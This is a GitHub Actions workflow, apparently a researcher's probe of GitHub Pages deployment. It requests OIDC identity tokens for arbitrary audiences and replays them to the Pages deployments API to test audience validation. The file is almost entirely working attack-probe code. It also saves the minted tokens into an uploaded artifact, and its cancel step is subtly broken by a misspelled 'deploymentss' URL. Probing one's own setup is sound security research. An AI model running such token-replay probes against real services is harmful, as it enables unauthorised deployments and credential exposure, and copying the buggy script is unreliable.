name: C10 OIDC Audience Probe
on:
  push:
    branches: [c10-oidc]
permissions:
  contents: read
  pages: write
  id-token: write
  actions: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          mkdir -p out
          echo "<h1>c10-oidc-replay-$GITHUB_RUN_ID</h1>" > out/index.html
      - uses: actions/upload-pages-artifact@v3
        with:
          path: out

  oidc-probe:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
      - name: Probe and replay
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        shell: bash
        run: |
          set +e
          mkdir -p /tmp/c10
          AUDS=("https://github.com/fox32932" "nobody" "x" "https://npm.pkg.github.com" "sigstore" "*")
          for AUD in "${AUDS[@]}"; do
            SAFE="${AUD//[^a-zA-Z0-9]/_}"
            [ -z "$SAFE" ] && SAFE="empty"
            echo "=== AUD='$AUD' SAFE=$SAFE ==="
            RESP=$(curl -sS -G --data-urlencode "audience=$AUD" -H "User-Agent: actions/oidc-client" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
            echo "$RESP" > "/tmp/c10/oidc_resp_${SAFE}.json"
            TOK=$(echo "$RESP" | jq -r '.value // empty')
            if [ -n "$TOK" ]; then
              echo "$TOK" > "/tmp/c10/oidc_token_${SAFE}.jwt"
              echo "issued: $SAFE"
            else
              echo "NO TOKEN: $RESP"
            fi
          done

          ARTIFACT_ID=$(curl -sS -H "Authorization: bearer $GH_TOKEN" "https://api.github.com/repos/fox32932/pages-test-cycle9/actions/runs/$GITHUB_RUN_ID/artifacts" | jq -r '.artifacts[] | select(.name=="github-pages") | .id')
          echo "artifact_id=$ARTIFACT_ID"

          # Baselines
          echo "=== BASELINE no oidc_token ==="
          BODY=$(jq -nc --arg v "c10-no-tok" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v}')
          curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployments" -d "$BODY" -w "\nHTTP %{http_code}\n" > /tmp/c10/baseline_no_tok.txt
          cat /tmp/c10/baseline_no_tok.txt

          echo "=== BASELINE garbage oidc_token ==="
          BODY=$(jq -nc --arg t "AAAA.BBBB.CCCC" --arg v "c10-garbage" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v, oidc_token:$t}')
          curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployments" -d "$BODY" -w "\nHTTP %{http_code}\n" > /tmp/c10/baseline_garbage.txt
          cat /tmp/c10/baseline_garbage.txt

          # Replay each audience-token (cancel any successful deployment)
          for TF in /tmp/c10/oidc_token_*.jwt; do
            SAFE=$(basename "$TF" .jwt | sed 's/oidc_token_//')
            T=$(cat "$TF")
            echo "=== REPLAY aud-safe=$SAFE ==="
            BODY=$(jq -nc --arg t "$T" --arg v "c10-rep-$SAFE" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v, oidc_token:$t}')
            curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployments" -d "$BODY" -w "\nHTTP %{http_code}\n" > "/tmp/c10/replay_${SAFE}.txt"
            cat "/tmp/c10/replay_${SAFE}.txt"
            DEPID=$(jq -r '.id // empty' "/tmp/c10/replay_${SAFE}.txt" 2>/dev/null)
            if [ -n "$DEPID" ] && [ "$DEPID" != "null" ]; then
              echo "Cancelling deployment $DEPID"
              curl -sS -X PUT -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deploymentss/$DEPID/cancel" -w "\nHTTP %{http_code}\n" >> "/tmp/c10/replay_${SAFE}.txt"
            fi
            sleep 1
          done

          tar czf /tmp/c10_artifacts.tar.gz -C /tmp c10
          ls -la /tmp/c10_artifacts.tar.gz

      - name: Upload probe data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: c10-oidc-probe
          path: /tmp/c10_artifacts.tar.gz
          retention-days: 1
          if-no-files-found: warn
